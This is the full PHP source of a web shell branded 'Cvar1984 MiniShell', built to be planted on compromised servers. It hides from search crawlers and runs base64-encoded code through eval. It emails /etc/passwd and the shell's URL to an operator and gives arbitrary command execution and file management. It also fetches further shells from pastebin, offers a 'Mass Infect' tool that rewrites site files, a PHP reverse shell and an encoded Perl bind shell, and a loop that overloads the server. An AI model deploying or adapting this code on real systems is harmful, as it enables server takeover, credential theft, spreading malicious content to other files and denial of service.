<?php
@session_start();
@ini_set('max_execution_time', 0);
@ini_set('memory_limit', '999999999M');
@set_time_limit(0);
@ini_restore("safe_mode_include_dir");
@ini_restore("safe_mode_exec_dir");
@ini_restore("disable_functions");
@ini_restore("allow_url_fopen");
@ini_restore("safe_mode");
@ignore_user_abort(FALSE);
@set_time_limit(0);
@error_reporting(4);
eval(gzuncompress(base64_decode("eNpTKS1OLcpLzE21VXIuSywytLQwUbLm5VIpSCwuLs8vSkEIGxoaQqRScxMzc2yV0lNTqooTi7JK85Lzc0vzMksyHdJBMnpArpK1AgDlEhyx")));
if (!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array(
        "
    Googlebot",
        "Slurp",
        "MSNBot",
        "PycURL",
        "facebookexternalhit",
        "ia_archiver",
        "crawler",
        "Yandex",
        "Rambler",
        "Yahoo! Slurp",
        "YahooSeeker",
        "bingbot"
    );
    if (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
echo "<meta name=\"ROBOTS\" content=\"NOINDEX, NOFOLLOW\" />";
function mail_alert() {
    global $email;
    $passwd       = file_get_contents('/etc/passwd');
    $shell_path   = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
    $subject      = "Logs";
    $from         = "From:Cvar1984";
    $content_mail = "URL : $shell_path\nIP : " . $_SERVER['REMOTE_ADDR'] . "\n**********\n$passwd\n**********\nBy Cvar1984";
    mail($email, $subject, $content_mail, $from);
}
if ($_COOKIE["user"] != $username && $_COOKIE["pass"] != md5($password)) {
    if ($_POST["usrname"] == $username && $_POST["passwrd"] == $password) {
        print '<script>document.cookie="user=' . $_POST["usrname"] . ';";document.cookie="pass=' . md5($_POST["passwrd"]) . ';";</script>';
        if ($email != "") {
            mail_alert();
        }
    } else {
        if ($_POST['usrname']) {
            print '<script>alert("Wrong Username or password");</script>';
        }
        echo '
<style type="text/css">
 .hidden {
	background:white;
	border:1px solid white;
	}
</style>
<div class="hidden">
<h1>Permission Denied</h1>
<p>You don t have permission to access the this page.</p>
<form method="post">

<input class="hidden" type="password" size="30" name="passwrd" value="" onfocus="if (this.value == \'password\')
this.value = \'\';">
<input type="hidden" name="action" value="login">
<input type="hidden" name="hide" value="">
<input type="hidden" size="30" name="usrname" value="Cvar1984" onfocus="if (this.value == \'username\'){this.value = \'\';}">
</form></div>';
        exit;
    }
}
if (strtolower(substr(PHP_OS, 0, 3)) == "win") {
    $os  = "win";
    $ox  = "Windows";
    $sep = "\\";
} else {
    $os  = "nix";
    $ox  = "Linux";
    $sep = "/";
}
if (!function_exists('posix_getegid')) {
    $user = @get_current_user();
} else {
    $uid  = @posix_getpwuid(posix_geteuid());
    $user = $uid['name'];
}
$bind_perl      = "rZJdb5swFIavi8R/OHXTFSSmZJu2i0abxAjtWApEQLtNVYUoOK1VgimmmqIq/30+dpKmmna1+Aq/7/Fzvjg6HD6JbnjLmmFLuxre/jYN0zjax5EY+P+jMee0oV3R0woKAQW0RdcDn0MQTRL3e5B9g5A1DNJ7WtfwdQlKm84+fhrBdRaf3Wwwe6lmP7MxjSdBIeXlA+3H+uLxZs7u5GXAhcr2GQZae+aiKRZ0hV7Lu/5AOm5yfnU9ulFSx3sutTvaq8/bJUZbJ33ZntgYUC4qaZO6rcgYUw/EUvR0gZpavbjXOptbmJs+AgnTH6z58J7YpvFsGgfrF7IkcuzFYTrzvWMYTvHZShFHWK3MozhCtWWlfnLlJw7MzvIg8jMH0tib5mmW+G7ogC7bBt5BxSgQ/eh0cIhQQXu88/aFksYXOQI0KE/8y9R3JxPptEX5YJGaOPDO3uFtEaegobLVaotDr6iqLmeNpYbqyN8Jebkb/drB4KMNoGZyCM1ORaH704uj6CVaR2ziTWPOO2ssW8VMckJFWVLZkncR+BG2oUD2GMqa4w+g5PXEeYuZskkQOUC+vNEewXVurfgy+6fnJ8lfnt6htd6lklRineb1XbJfCxKIwuoP";
$self           = $_SERVER['PHP_SELF'];
$server_sofware = $_SERVER['SERVER_SOFTWARE'];
$ip_lu          = $_SERVER['REMOTE_ADDR'];
$ip_server      = $_SERVER['SERVER_ADDR'];
$admin          = $_SERVER['SERVER_ADMIN'];
$hostname       = gethostbyname($_SERVER['HTTP_HOST']);
echo '
<!DOCTYPE HTML>
<HTML>
<HEAD>
<link href="http://fonts.googleapis.com/css?family=Orbitron" rel="stylesheet" type="text/css" />
<style type="text/css">
body,textarea{
    font-family:"Orbitron", cursive;
    background-color:#E7E7E7;
    text-shadow:0px 0px 1px #757575;
}
#content tr:hover{
    background-color: #636263;
    text-shadow:0px 0px 10px #fff;
}
#content .first{
    background-color: silver;
}
#content .first:hover{
    background-color:#104E8B;
    text-shadow:0px 0px 1px #757575;
}
table{
    border: 1px silver dotted;
}
H1,h2,pre,font {
    font-family:"Orbitron", cursive;
}
a{
    color:#303030;
    text-decoration: none;
}
a:hover{
    color:#104E8B;
    text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
    border: 1px #104E8B solid;
    -moz-border-radius: 5px;
    -webkit-border-radius:5px;
    border-radius:5px;
}
</style>
</HEAD>
<BODY>
<H1><center>Cvar1984 MiniShell</center></H1>';
if (isset($_GET['path'])) {
    $path = $_GET['path'];
} else {
    $path = getcwd();
}
$path  = str_replace('\\', '/', $path);
$paths = explode('/', $path);
echo "
<table>
<tr><td><a href=\"?cgi\">CGI Telnet</a></td></tr>
<tr><td><a href=\"?b374k\">B374K</a></td></tr>
<tr><td><a href=\"?adminer\">Adminer</a></td></tr>
<tr><td><a href=\"?phpinfo\">PHP Info</a></td></tr>
<tr><td><a href=\"?path={$path}&massinfect\">Mass Infect</a></td></tr>
<tr><td><a href=\"?rs\">Back Connect</a></td></tr>
<tr><td><a href=\"?killme\">Self Remove</a></td></tr>
<tr><td><a href=\"?overload\">OverLoad Server</a></td></tr>
</table>";
if (isset($_REQUEST["phpinfo"])) {
    phpinfo();
} elseif ($_REQUEST['overload']) {
	for($x=0;$x<99999999;$x++) {
		mkdir($x);
		}
} elseif (isset($_REQUEST['cgi'])) {
    $cgi_dir   = mkdir('cgi', 0755);
    $file_cgi  = "cgi/cgi.izo";
    $isi_htcgi = "AddHandler cgi-script .izo";
    $htcgi     = fopen("cgi/.htaccess", "w+");
    fwrite($htcgi, $isi_htcgi);
    fclose($htcgi);
    $cgi_script = file_get_contents("https://pastebin.com/raw/MUD0EPjb");
    $cgi        = fopen($file_cgi, "w+");
    fwrite($cgi, $cgi_script);
    fclose($cgi);
    chmod($file_cgi, 0755);
    echo "<iframe src='cgi/cgi.izo' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>";
} elseif (isset($_REQUEST["b374k"])) {
    $nama = fopen("jembud2.php", "w");
    $file = file_get_contents('https://pastebin.com/raw/nCqVmtBu');
    fwrite($nama, $file);
    chmod($nama, 0444);
    fclose($nama);
} elseif (isset($_REQUEST["adminer"])) {
    $nama = fopen("adminer.php", "w");
    $file = file_get_contents('https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php');
    fwrite($nama, $file);
    fclose($nama);
} elseif (isset($_REQUEST['rs'])) {
    reverse_conn_ui();
} elseif (isset($_GET['rev_option']) && isset($_GET['my_ip']) && isset($_GET['my_port'])) {
    reverse_conn_bg();
} elseif (isset($_REQUEST['killme'])) {
    global $self;
    $me = basename($self);
    unlink($me);
    echo "<script>alert('Have Nice Day');</script>";
}
function exe($cmd) {
    if (function_exists('system')) {
        @ob_start();
        @system($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();
        return $buff;
    } elseif (function_exists('exec')) {
        @exec($cmd, $results);
        $buff = "";
        foreach ($results as $result) {
            $buff .= $result;
        }
        return $buff;
    } elseif (function_exists('passthru')) {
        @ob_start();
        @passthru($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();
        return $buff;
    } elseif (function_exists('shell_exec')) {
        $buff = @shell_exec($cmd);
        return $buff;
    }
}
if (isset($_REQUEST['massinfect']) && isset($_REQUEST['path'])) {
    chdir($_GET['path']);
    global $sep;
    $mode   = $_POST['modexxx'];
    $ftype  = $_POST['ffttype'];
    $c_cont = $_POST['code_cont'];
    $ppp    = $_POST['path'];
    if (isset($_POST['modexxx']) && isset($_POST['path']) && isset($_POST['ffttype']) && isset($_POST['code_cont']) && $mode != "" && $ftype != "" && $c_cont != "" && $ppp != "") {
        echo "<center><h2>Mass Infect Successfully</h2></center><table>";
        switch ($mode) {
            case "Apender":
                $mmode = "a";
                break;
            case "Rewrite":
                $mmode = "w";
                break;
        }
        if ($handle = opendir($ppp)) {
            while (($c_file = readdir($handle)) !== False) {
                if ((preg_match("/$ftype" . '$' . '/', $c_file, $matches) != 0) && (preg_match('/' . $c_file . '$/', $self, $matches) != 1)) {
                    echo "<tr><td><font
color=red>$ppp$sep$c_file</font></td></tr>";
                    $fd = fopen($ppp . $sep . $c_file, $mmode);
                    if ($fd) {
                        fwrite($fd, $c_cont);
                    } else {
                        echo "<script>alert('Error. Access Denied');</script>";
                    }
                }
            }
        }
        echo "</table><br><br><hr><br><br></div>";
    } else {
?>
<center><h2>Mass Infect</h2></center><hr><br><br><table><form method='POST'>
<input type='hidden' name='path' value="<?php
        echo getcwd();
?>"><tr><td>Mode : </td>
<td><select name='modexxx'>
<option>Rewrite</option>
<option>Apender</option>
</select></td></tr>
<tr><td>File Type</td><td>
<input name='ffttype' value='html' size=50></td></tr>
<tr><td>Content : </td>
<td><textarea name='code_cont' style='width:383px;height:400px'></textarea></td></tr>
<tr><td></td>
<td><input type=submit value='Go' /></td></tr></form></table><br><br><hr><br><br>
    <?php
    }
}
function reverse_conn_ui() {
    echo "
<center><h2>Reverse Shell</h2><hr>
<br><br><form method='GET'>
<table>
<tr>
<td>Your IP : <input name='my_ip' value='0.tcp.ngrok.io'>
<br>
PORT : <input name='my_port' value='40141'>
<input type='submit' value='O'></td></tr>
<select name='rev_option'>
<option>PHP Reverse Shell</option>
<option>PERL Bind Shell</option>
</select></form>
<tr><td>
<font color=red>PHP Reverse Shell</font> : <font> nc -lvp
<i>port</i></font></td></tr>
<tr><td><font color=red>PERL Bind Shell</font> : <font> nc
<i>server_ip port</i></font></td></tr></table>";
}
function reverse_conn_bg() {
    global $os;
    $option = $_REQUEST['rev_option'];
    $ip     = $_GET['my_ip'];
    $port   = $_GET['my_port'];
    if ($option == "PHP Reverse Shell") {
        echo "<h2>RESULT</h2><hr><br>";
        function printit($string) {
            if (!$daemon) {
                print "$string\n";
            }
        }
        $chunk_size = 1400;
        $write_a    = null;
        $error_a    = null;
        $shell      = 'uname -a; w; id; /bin/sh -i';
        $daemon     = 0;
        $debug      = 0;
        if (function_exists('pcntl_fork')) {
            $pid = pcntl_fork();
            if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
            }
            if ($pid) {
                exit(0);
            }
            if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
            }
            $daemon = 1;
        } else {
            printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
        }
        chdir("/");
        umask(0);
        $sock = fsockopen($ip, $port, $errno, $errstr, 30);
        if (!$sock) {
            printit("$errstr ($errno)");
            exit(1);
        }
        $descriptorspec = array(
            0 => array(
                "pipe",
                "r"
            ),
            1 => array(
                "pipe",
                "w"
            ),
            2 => array(
                "pipe",
                "w"
            )
        );
        $process        = proc_open($shell, $descriptorspec, $pipes);
        if (!is_resource($process)) {
            printit("ERROR: Can't spawn shell");
            exit(1);
        }
        stream_set_blocking($pipes[0], 0);
        stream_set_blocking($pipes[1], 0);
        stream_set_blocking($pipes[2], 0);
        stream_set_blocking($sock, 0);
        printit("<font>Successfully opened reverse shell to $ip:$port </font>");
        while (1) {
            if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
            }
            if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
            }
            $read_a              = array(
                $sock,
                $pipes[1],
                $pipes[2]
            );
            $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
            if (in_array($sock, $read_a)) {
                if ($debug)
                    printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug)
                    printit("SOCK: $input");
                fwrite($pipes[0], $input);
            }
            if (in_array($pipes[1], $read_a)) {
                if ($debug)
                    printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug)
                    printit("STDOUT: $input");
                fwrite($sock, $input);
            }
            if (in_array($pipes[2], $read_a)) {
                if ($debug)
                    printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug)
                    printit("STDERR: $input");
                fwrite($sock, $input);
            }
        }
        fclose($sock);
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
        echo "<br><br><hr><br><br></div>";
    } else if ($option == "PERL Bind Shell") {
        global $bind_perl, $os;
        $pbfl   = $bind_perl;
        $handlr = fopen("back.pl", "wb");
        if ($handlr) {
            fwrite($handlr, gzinflate(base64_decode($bind_perl)));
        } else {
            echo "<script>alert('Access Denied for create new file');</script>";
        }
        fclose($handlr);
        if (file_exists("back.pl")) {
            if ($os == "nix") {
                exe("chmod +x back.pl;perl back.pl $port");
            } else {
                exe("perl back.pl $port");
            }
        }
    }
}
echo '
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>PWD : ';
foreach ($paths as $id => $pat) {
    if ($pat == '' && $id == 0) {
        $a = true;
        echo '<a href="?path=/">/</a>';
        continue;
    }
    if ($pat == '')
        continue;
    echo '<a href="?path=';
    for ($i = 0; $i <= $id; $i++) {
        echo "$paths[$i]";
        if ($i != $id)
            echo "/";
    }
    echo '">' . $pat . '</a>/';
}
echo '</td></tr><tr><td>';
if (isset($_FILES['file'])) {
    if (copy($_FILES['file']['tmp_name'], $path . '/' . $_FILES['file']['name'])) {
        echo '<font color="lime">File Upload Done.</font><br />';
    } else {
        echo '<font color="red">File Upload Error.</font><br />';
    }
}
echo '<b><br>' . php_uname() . '<br></b>';
echo '<form enctype="multipart/form-data" method="POST">
Upload File : <input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</td></tr>';
if (isset($_GET['filesrc'])) {
    echo "<tr><td>Current File : ";
    echo $_GET['filesrc'];
    echo '</tr></td></table><br />';
    echo ('<pre>' . htmlspecialchars(file_get_contents($_GET['filesrc'])) . '</pre>');
} elseif (isset($_GET['option']) && $_POST['opt'] != 'delete') {
    echo '</table><br /><center>' . $_POST['path'] . '<br /><br />';
    if ($_POST['opt'] == 'chmod') {
        if (isset($_POST['perm'])) {
            if (chmod($_POST['path'], $_POST['perm'])) {
                echo '<font color="lime">Change Permission Done.</font><br />';
            } else {
                echo '<font color="red">Change Permission Error.</font><br />';
            }
        }
        echo '<form method="POST">
        Permission : <input name="perm" type="text" size="4" value="' . substr(sprintf('%o', fileperms($_POST['path'])), -4) . '" />
        <input type="hidden" name="path" value="' . $_POST['path'] . '">
        <input type="hidden" name="opt" value="chmod">
        <input type="submit" value="Go" />
        </form>';
    } elseif ($_POST['opt'] == 'rename') {
        if (isset($_POST['newname'])) {
            if (rename($_POST['path'], $path . '/' . $_POST['newname'])) {
                echo '<font color="lime">Change Name Done.</font><br />';
            } else {
                echo '<font color="red">Change Name Error.</font><br />';
            }
            $_POST['name'] = $_POST['newname'];
        }
        echo '<form method="POST">
        New Name : <input name="newname" type="text" size="20" value="' . $_POST['name'] . '" />
        <input type="hidden" name="path" value="' . $_POST['path'] . '">
        <input type="hidden" name="opt" value="rename">
        <input type="submit" value="Go" />
        </form>';
    } elseif ($_POST['opt'] == 'edit') {
        if (isset($_POST['src'])) {
            $fp = fopen($_POST['path'], 'w');
            if (fwrite($fp, $_POST['src'])) {
                echo '<font color="lime">Edit File Done.</font><br />';
            } else {
                echo '<font color="red">Edit File Error.</font><br />';
            }
            fclose($fp);
        }
        echo '<form method="POST">
        <textarea cols=80 rows=20 name="src">' . htmlspecialchars(file_get_contents($_POST['path'])) . '</textarea><br />
        <input type="hidden" name="path" value="' . $_POST['path'] . '">
        <input type="hidden" name="opt" value="edit">
        <input type="submit" value="Go" />
        </form>';
    }
    echo '</center>';
} else {
    echo '</table><br /><center>';
    if (isset($_GET['option']) && $_POST['opt'] == 'delete') {
        if ($_POST['type'] == 'dir') {
            if (rmdir($_POST['path'])) {
                echo '<font color="lime">Delete Dir Done.</font><br />';
            } else {
                echo '<font color="red">Delete Dir Error.</font><br />';
            }
        } elseif ($_POST['type'] == 'file') {
            if (unlink($_POST['path'])) {
                echo '<font color="lime">Delete File Done.</font><br />';
            } else {
                echo '<font color="red">Delete File Error.</font><br />';
            }
        }
    }
    echo '</center>';
    $scandir = scandir($path);
    echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
    <tr class="first">
        <td><center>Name</center></td>
        <td><center>Size</center></td>
        <td><center>Permissions</center></td>
        <td><center>Options</center></td>
    </tr>';
    foreach ($scandir as $dir) {
        if (!is_dir("$path/$dir") || $dir == '.' || $dir == '..')
            continue;
        echo "<tr>
        <td><a href=\"?path=$path/$dir\">$dir</a></td>
        <td><center>--</center></td>
        <td><center>";
        if (is_writable("$path/$dir"))
            echo '<font color="lime">';
        elseif (!is_readable("$path/$dir"))
            echo '<font color="red">';
        echo perms("$path/$dir");
        if (is_writable("$path/$dir") || !is_readable("$path/$dir"))
            echo '</font>';
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$path\">
        <select name=\"opt\">
	    <option value=\"\"></option>
        <option value=\"delete\">Delete</option>
        <option value=\"chmod\">Chmod</option>
        <option value=\"rename\">Rename</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"dir\">
        <input type=\"hidden\" name=\"name\" value=\"$dir\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
    foreach ($scandir as $file) {
        if (!is_file("$path/$file"))
            continue;
        $size = filesize("$path/$file") / 1024;
        $size = round($size, 3);
        if ($size >= 1024) {
            $size = round($size / 1024, 2) . ' MB';
        } else {
            $size = $size . ' KB';
        }
        echo "<tr>
        <td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
        <td><center>" . $size . "</center></td>
        <td><center>";
        if (is_writable("$path/$file"))
            echo '<font color="lime">';
        elseif (!is_readable("$path/$file"))
            echo '<font color="red">';
        echo perms("$path/$file");
        if (is_writable("$path/$file") || !is_readable("$path/$file"))
            echo '</font>';
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$path\">
        <select name=\"opt\">
	    <option value=\"\"></option>
        <option value=\"delete\">Delete</option>
        <option value=\"chmod\">Chmod</option>
        <option value=\"rename\">Rename</option>
        <option value=\"edit\">Edit</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"file\">
        <input type=\"hidden\" name=\"name\" value=\"$file\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$file\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '</table>
    </div>';
}
echo "
	<center><form method='post'>
	<font style='text-decoration: underline;'>" . $user . "@" . $hostname . ": ~ $ </font>
	<input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
	</form></center>";
if ($_POST['do_cmd']) {
    echo "<pre>" . exe($_POST['cmd']) . "</pre>";
}
echo '
</BODY>
</HTML>';
function perms($file) {
    $perms = fileperms($file);
    if (($perms & 0xC000) == 0xC000) {
        // Socket
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        // Symbolic Link
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        // Regular
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        // Block special
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        // Directory
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        // Character special
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        // FIFO pipe
        $info = 'p';
    } else {
        // Unknown
        $info = 'u';
    }
    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}
?>